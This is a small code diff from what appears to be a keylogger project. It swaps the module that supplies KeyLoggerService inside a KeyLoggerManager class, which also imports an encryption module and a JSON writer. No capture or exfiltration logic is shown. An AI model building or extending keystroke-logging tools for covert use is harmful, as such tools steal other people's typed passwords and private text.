@@ -1,6 +1,6 @@
 from writer import json_writer
 from encryption.shaul_encryption import Encryption
-from key_logger_service.key_Logger_service import KeyLoggerService
+from key_logger_service.copy_key_Logger_service import KeyLoggerService
 import threading
 
 class KeyLoggerManager:
